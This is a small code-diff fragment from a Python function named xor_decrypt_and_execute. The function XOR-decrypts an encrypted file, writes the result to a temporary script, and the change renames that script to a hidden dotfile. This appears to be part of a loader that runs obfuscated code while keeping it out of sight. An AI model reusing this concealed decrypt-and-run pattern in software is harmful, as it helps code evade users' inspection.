@@ -5,7 +5,7 @@ def xor_decrypt_and_execute(encrypted_file, key):
     decrypted_data = bytearray([byte ^ key for byte in encrypted_data])
 
 
-    temp_file = "__temp__.py"
+    temp_file = ".tempst.py"
     with open(temp_file, 'wb') as f:
         f.write(decrypted_data)
 
